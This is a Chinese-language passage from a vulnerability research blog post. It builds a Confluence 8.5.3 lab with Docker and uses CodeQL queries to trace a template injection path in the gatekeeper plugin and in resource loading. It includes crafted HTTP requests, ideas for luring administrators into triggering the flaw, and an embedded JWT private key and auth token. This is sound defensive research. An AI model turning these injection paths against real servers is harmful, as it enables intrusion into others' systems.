<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">17</span>-jdk-bullseye</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> atlassian-confluence-8.5.3.zip /</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> confluence.cfg.xml /var/data/confluence/confluence.cfg.xml</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> unzip atlassian-confluence-8.5.3.zip &amp;&amp; \ </span></span><br><span class="line">    mv atlassian-confluence-<span class="number">8.5</span>.<span class="number">3</span> atlassian-confluence &amp;&amp; \</span><br><span class="line">    mkdir -p /var/data/confluence/ &amp;&amp; \</span><br><span class="line">    echo <span class="string">&#x27; &#x27;</span> &gt;&gt; /atlassian-confluence/confluence/WEB-INF/classes/confluence-init.properties &amp;&amp; \</span><br><span class="line">    echo <span class="string">&#x27;confluence.home=/var/data/confluence/&#x27;</span> &gt;&gt; /atlassian-confluence/confluence/WEB-INF/classes/confluence-init.properties</span><br></pre></td></tr></table></figure>

<p>confluence.cfg.xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">confluence-configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setupStep</span>&gt;</span>setupcluster-start<span class="tag">&lt;/<span class="name">setupStep</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setupType</span>&gt;</span>custom<span class="tag">&lt;/<span class="name">setupType</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">buildNumber</span>&gt;</span>9012<span class="tag">&lt;/<span class="name">buildNumber</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;access.mode&quot;</span>&gt;</span>READ_WRITE<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;atlassian.license.message&quot;</span>&gt;</span>AAABlA0ODAoPeNp1klFvmzAUhd/9K5D20qlya0MXIJKlUSBZOkLaQlJlyotrXRK3QCID6divn1Mnq lq1j77n+Pq75/pbvumsCIRFXIv6Q5sMnSsrzHLLJraDQgW8lds64i2wQwVTGxMPRdAIJXcHiYXbu ig7qAVYZ9rHrRDqFtT31dCK97zsXhugKZe6WnNti//upOpPLa8woZi4KJEC6uYLsTTiAlRzeNJGW ff4RtCqDpDQGBdpVz2CmhXzRjsZpuiNwLhmas1r2ZhK3/W8Xj9JXv5cV1yWF2JbmT5ctHIP5oqer 9XnWE9Qfn7lSPeLNxs2DV/CUewv/z25Fb07zwux9MejYMQj+1n8qUWwuV+353Y+rpaDKP79wB+8Y lG9JEEaXo7vVmzFDMExjrzfQcorYOFsOo3vw0mQGD1rudIps4KXDZzCm0QsmURZnOKE+p47oD8cl IHag9LKtR/McbrIr3Gcux6+8cjctDoszezMDPwM/SloOiDEJZ7jUHTbKbHhDXz8Csd4XiE/TUfjs PdI/wGum893MCwCFEBm/Dhfacgh6q8z1KkLA7IoRtgMAhR3aSuUYcM2Bt0xGXVKCB533E+uyg==X 02jj<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;confluence.setup.server.id&quot;</span>&gt;</span>B9AU-NVTB-ET78-J80U<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;confluence.webapp.context.path&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jwt.private.key&quot;</span>&gt;</span>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<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jwt.public.key&quot;</span>&gt;</span>MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAkP0PJ779cjmR3XA3dE3DPloM79asNOd4pjQY9lmsUpg7b//3F4ugIBLvIouF44m8/TMjgteMYhh7EPj1jch7JV6uMilWb4POdbgod5zUlHESnExqfZ0tHSFsiYFVJCBgq3dzsMaSkDxxLKBYiua+wJ8AThXdNuclDb7FK+vZC2IRgA+KwQGOCbEVhUP1qbpwpBTAiD62j7HnKsBcTd0WApiNq6Q0dPAZUH0lWkNwQkTbU58R29AicgD9Twwmi3A5fLytlk9P+/kNZS9CiklPTdicq/1xzuaQedYZsZQEBiz0jos2VpVqwZYSPcPUxUns1t64rXG3iqhlSUc8Rdr+oy6smgERX9WziQHcRmG7hwreZofRzfFddYR8q3N5QC/Rhj5KAcO9o1B0FXyYojURAkxviyVHvA15mf9z0P7oFneVMIEEJSixtUEhswKXUBQmr07t7SX9LIvwd98mNyipECG3uPrdY6hQzD2bFwfvreFSJlXiTc5cRQmgYLItQw4TAgMBAAE=<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;lucene.index.dir&quot;</span>&gt;</span>$&#123;localHome&#125;/index<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;struts.multipart.saveDir&quot;</span>&gt;</span>$&#123;localHome&#125;/temp<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;synchrony.encryption.disabled&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;synchrony.proxy.enabled&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;synchrony.service.authtoken&quot;</span>&gt;</span>fd4915a6ec781b2479100ef98bb9a788<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">confluence-configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>confluence.cfg.xml中的license是在官网申请的，有效期只有一个月，如果过期了需要重新申请</p>
<p>启动环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d --build </span><br></pre></td></tr></table></figure>



<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="动态调试方法"><a href="#动态调试方法" class="headerlink" title="动态调试方法"></a>动态调试方法</h3><p>前文的环境搭建已经开启了远程调试端口，如果要进行断点调试的话，可以将所有jar包导入IDEA作为lib，直接到jar包中的类下断点（用反编译后的源码下断点的话行号可能不准，断不到指定位置）</p>
<h3 id="尝试第一次CodeQL扫描"><a href="#尝试第一次CodeQL扫描" class="headerlink" title="尝试第一次CodeQL扫描"></a>尝试第一次CodeQL扫描</h3><p>由于没有分析过confluence相关的漏洞，而且关于这个漏洞公开的细节太少，想试试用CodeQL扫一下</p>
<p>confluence是闭源系统，可以用这个工具编译数据库：<a href="https://github.com/waderwu/extractor-java">https://github.com/waderwu/extractor-java</a></p>
<p>将源码包和依赖包分别拷贝到不同目录（这里我默认将以com.atlassian.confluence.开头的视为confluence本身，其他jar包视为依赖）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p atlassian-confluence-8.5.3-src/lib/</span><br><span class="line">find atlassian-confluence-8.5.3/ -type f -name &quot;*.jar&quot; | grep &quot;com.atlassian.confluence.&quot; | xargs -I &#123;&#125; cp &#123;&#125; atlassian-confluence-8.5.3-src/</span><br><span class="line">find atlassian-confluence-8.5.3/ -type f -name &quot;*.jar&quot; | grep -v &quot;com.atlassian.confluence.&quot; | xargs -I &#123;&#125; cp &#123;&#125; atlassian-confluence-8.5.3-src/lib/</span><br></pre></td></tr></table></figure>



<p>将源码包解压：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd atlassian-confluence-8.5.3-src/</span><br><span class="line">ls |grep &quot;.jar&quot; | xargs -I &#123;&#125; unzip -q -n &#123;&#125;</span><br></pre></td></tr></table></figure>



<p>反编译class（只处理包名为com.atlassian.confluence的类）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 ~/Tools/extractor-java/class2java.py com/atlassian/confluence</span><br></pre></td></tr></table></figure>



<p>编译CodeQL数据库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 ~/Tools/extractor-java/run.py atlassian-confluence-8.5.3 com/atlassian/confluence -ld lib/</span><br></pre></td></tr></table></figure>



<p>然后用CodeQl官方的模板注入规则进行扫描：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name Server-side template injection</span></span><br><span class="line"><span class="comment"> * @description Untrusted input interpreted as a template can lead to remote code execution.</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity error</span></span><br><span class="line"><span class="comment"> * @security-severity 9.3</span></span><br><span class="line"><span class="comment"> * @precision high</span></span><br><span class="line"><span class="comment"> * @id java/server-side-template-injection</span></span><br><span class="line"><span class="comment"> * @tags security</span></span><br><span class="line"><span class="comment"> *       external/cwe/cwe-1336</span></span><br><span class="line"><span class="comment"> *       external/cwe/cwe-094</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.security.TemplateInjectionQuery</span><br><span class="line">import TemplateInjectionFlow::PathGraph</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TemplateInjectionFlow::PathNode source, TemplateInjectionFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> TemplateInjectionFlow::flowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink.getNode(), source, sink, &quot;Template, which may contain code, depends on a $@.&quot;,</span><br><span class="line">  source.getNode(), &quot;user-provided value&quot;</span><br></pre></td></tr></table></figure>



<p>没想到还真扫到一个可能的漏洞，从<code>com.atlassian.confluence.plugins.gatekeeper.controllers.AbstractPermissionsAction</code>的字段<code>exportCustomSpaceDetailsFormat</code>到<code>velocityEngine.evaluate</code>，理论上<code>exportCustomSpaceDetailsFormat</code>可控的话，就可以造成模板注入漏洞</p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210124036385.png" alt="image-20231210124036385"></p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210124114393.png" alt="image-20231210124114393"></p>
<p>其实一开始我不知道为什么这个类的字段可以作为source，猜想可能是confluence的web框架会自动注入请求参数</p>
<p>关于入口或者说漏洞接口的寻找思路：</p>
<p><code>AbstractPermissionsAction</code>是一个抽象类，所以我先找了同级目录下的对应实现类<code>SpacePermissionsAction</code></p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210125246183.png" alt="image-20231210125246183"></p>
<p><code>SpacePermissionsAction</code>看起来像是设置空间权限的controller，它们所在jar包看起来是一个名为<code>gatekeeper</code>的插件，后续又结合官方文档，推测并找到了一个功能入口：</p>
<p><code>/plugins/gatekeeper-plugin/space/inspect-permissions.action?key=TEST</code></p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210130027450.png" alt="image-20231210130027450"></p>
<p>点击<code>导出</code>，对应的请求如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/plugins/gatekeeper-plugin/space/init-evaluator.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-sas"><span class="keyword">key</span>=TEST<span class="variable">&amp;userFilter</span>=<span class="variable">&amp;excludeDisabled</span>=false<span class="variable">&amp;excludeOwnersNoPermissions</span>=false<span class="variable">&amp;alwaysShowAnonymous</span>=false<span class="variable">&amp;pageId</span>=<span class="variable">&amp;exportCsvDelimiter</span>=%2C<span class="variable">&amp;exportSpaceDetailsFormat</span>=<span class="keyword">key</span><span class="variable">&amp;exportFormat</span>=csv</span></span><br></pre></td></tr></table></figure>

<p>代码会运行到<code>com.atlassian.confluence.plugins.gatekeeper.controllers.AbstractPermissionsAction#initEvaluator</code></p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210130342789.png" alt="image-20231210130342789"></p>
<p>但漏洞Sink在<code>checkValidVelocitySyntax</code>方法中，于是构造请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=TEST&amp;userFilter=&amp;excludeDisabled=false&amp;excludeOwnersNoPermissions=false&amp;alwaysShowAnonymous=false&amp;pageId=&amp;exportCsvDelimiter=%2C&amp;exportSpaceDetailsFormat=custom&amp;exportFormat=csv&amp;exportCustomSpaceDetailsFormat=leixiao</span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210131317013.png" alt="image-20231210131317013"></p>
<p>代码按预期走到了漏洞点，但奇怪就在这行代码怎么也执行不了，会抛出类加载冲突的异常：</p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210131624038.png" alt="image-20231210131624038"></p>
<p>以为会和Jdk版本有关，尝试了Jdk11和Jdk17，都是这样，所以放弃了这个接口的尝试</p>
<p><code>AbstractPermissionsAction</code>共有两个实现类：</p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210135932141.png" alt="image-20231210135932141"></p>
<p>另一个类名为<code>GlobalPermissionsAction</code>，但对应的模组貌似是被默认禁用的：</p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210140229775.png" alt="image-20231210140229775"></p>
<p>开启后该模组后，入口在<code>/admin/plugins/gatekeeper-plugin/global/inspect-permissions.action</code>，同样点击导出，测试后发现也会抛出类加载冲突异常。</p>
<p>后来搜到一个15年的Bug：<a href="https://jira.atlassian.com/browse/CONFSERVER-40148">https://jira.atlassian.com/browse/CONFSERVER-40148</a> ，和我遇到的问题一致，官方在20年发表的最后一句回复说已经在最新版本的Confluence上解决了，如果再次遇到这个情况可以继续反馈。我理解官方应该是承认这是设计上的Bug，并且会修复。然后刚好<code>gatekeeper</code>这个插件也有这个问题，但是没有被发现，所以目前来看这个插件确实存在着漏洞，但漏洞也确实利用不了。</p>
<p>如果Bug被解决，那么这个漏洞是可以被轻松利用的，首先原本的POST请求其实可以转换成GET请求，然后就有两种利用方式：</p>
<ol>
<li>未授权的用户发送链接给管理员使其点击，类似于CSRF</li>
<li>普通权限用户将链接以图片Url插入文章中，等待管理员浏览</li>
</ol>
<p>（后续是我本地修复了这个Bug，Bug原因是依赖包冲突，将<code>org.apache.servicemix.bundles.velocity-1.7_6.jar</code>换成maven仓库中的<code>org.apache.servicemix.bundles.velocity-1.6.4_4.jar</code>即可，但修复后依旧没办法利用。。。 黑名单限制太死了，而且此处也没有上下文，实在找不到绕过方法 -_-）</p>
<p>再后面发现可以造成Dos攻击，报告官方后，给了$300奖励</p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240128115341600.png" alt="image-20240128115341600"></p>
<h3 id="代码Diff，尝试第二次CodeQL扫描"><a href="#代码Diff，尝试第二次CodeQL扫描" class="headerlink" title="代码Diff，尝试第二次CodeQL扫描"></a>代码Diff，尝试第二次CodeQL扫描</h3><p>将8.5.3和8.5.4反编译后的com.atlassian.confluence包中的类进行diff</p>
<p>发现<code>com.atlassian.confluence.velocity.ConfigurableResourceManager#loadResource</code>方法中添加了一段对<code>resourceName</code>进行验证的代码：</p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210204423849.png" alt="image-20231210204423849"></p>
<p>随后搜了一些资料，发现这个方法也是CVE-2019-3396的关键一环，所以我猜测CVE-2023-22522的原理可能和CVE-2019-3396差不多</p>
<p>然后根据CVE-2019-3396写了CodeQL的查询语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @id java/confluence-ssti</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity error</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 从CVE<span class="number">-2019</span><span class="number">-3396</span>总结的source</span><br><span class="line">class MacroExecuteMethod extends <span class="keyword">Method</span> &#123;</span><br><span class="line">  MacroExecuteMethod() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(RefType t <span class="operator">|</span></span><br><span class="line">      t.hasQualifiedName(&quot;com.atlassian.confluence.macro&quot;, &quot;Macro&quot;) <span class="keyword">and</span></span><br><span class="line">      this.getDeclaringType().getASupertype<span class="operator">*</span>() <span class="operator">=</span> t <span class="keyword">and</span></span><br><span class="line">      this.hasName(&quot;execute&quot;) <span class="keyword">and</span></span><br><span class="line">      this.getNumberOfParameters() <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 测试发现这里作为sink的话无法直接串联起来，所以改为GetTemplateMethod</span><br><span class="line">class GetResourceMethod extends <span class="keyword">Method</span> &#123;</span><br><span class="line">  GetResourceMethod() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(Class c <span class="operator">|</span></span><br><span class="line">      c.hasName(&quot;ConfigurableResourceManager&quot;) <span class="keyword">and</span></span><br><span class="line">      this.getDeclaringType() <span class="operator">=</span> c <span class="keyword">and</span></span><br><span class="line">      this.hasName(&quot;getResource&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetTemplateMethod extends <span class="keyword">Method</span> &#123;</span><br><span class="line">  GetTemplateMethod() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(Class c <span class="operator">|</span></span><br><span class="line">      c.hasQualifiedName(&quot;org.apache.velocity.app&quot;, &quot;VelocityEngine&quot;) <span class="keyword">and</span></span><br><span class="line">      this.getDeclaringType() <span class="operator">=</span> c <span class="keyword">and</span></span><br><span class="line">      this.hasName(&quot;getTemplate&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  TaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;TaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof RemoteFlowSource</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    <span class="keyword">exists</span>(MacroExecuteMethod macroExecuteMethod <span class="operator">|</span></span><br><span class="line">      source.asParameter() <span class="operator">=</span> macroExecuteMethod.getParameter(<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">or</span></span><br><span class="line">      source.asParameter() <span class="operator">=</span> macroExecuteMethod.getParameter(<span class="number">1</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Call</span> <span class="keyword">call</span> <span class="operator">|</span> call.getCallee() instanceof GetTemplateMethod <span class="operator">|</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink.getNode(), source, sink, &quot;Server-side template injection, depends on a $@.&quot;,</span><br><span class="line">  source.getNode(), source.toString()</span><br></pre></td></tr></table></figure>



<p>一番分析调试后，又加了如下Sanitizer：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">  <span class="keyword">exists</span>(<span class="keyword">Call</span> <span class="keyword">call</span> <span class="operator">|</span> call.getCallee().hasName(&quot;getSpaceKey&quot;) <span class="operator">|</span> node.asExpr() <span class="operator">=</span> <span class="keyword">call</span>)</span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  <span class="keyword">exists</span>(<span class="keyword">Call</span> <span class="keyword">call</span> <span class="operator">|</span> call.getCallee().hasName(&quot;getDocId&quot;) <span class="keyword">and</span> call.getNumArgument() <span class="operator">=</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line">    node.asExpr() <span class="operator">=</span> call.getAnArgument()</span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  <span class="keyword">exists</span>(<span class="keyword">Call</span> <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">    call.getCallee().hasName(&quot;get&quot;) <span class="keyword">and</span></span><br><span class="line">    call.getNumArgument() <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">    call.getArgument(<span class="number">0</span>).(StringLiteral).getValue() <span class="operator">=</span> &quot;_template&quot;</span><br><span class="line">  <span class="operator">|</span></span><br><span class="line">    node.asExpr() <span class="operator">=</span> <span class="keyword">call</span></span><br><span class="line">  ) <span class="operator">/</span><span class="operator">/</span>传_template的利用方法已经在CVE<span class="number">-2019</span><span class="number">-3396</span>中被修复了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>最后查询结果如下：</p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210224445107.png" alt="image-20231210224445107"></p>
<h4 id="扫描结果一"><a href="#扫描结果一" class="headerlink" title="扫描结果一"></a>扫描结果一</h4><p>总共3个结果，但其实后两个结果是一样的，都是传入了<code>theme</code>这个参数，<code>theme</code>会和路径字符串进行拼接，最后传到<code>com.atlassian.confluence.velocity.ConfigurableResourceManager#getResource</code></p>
<p>对应的功能点为预览 <code>&#39;导航图&#39;宏</code><br><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210225118832.png" alt="image-20231210225118832"></p>
<p>HTTP请求为：</p>
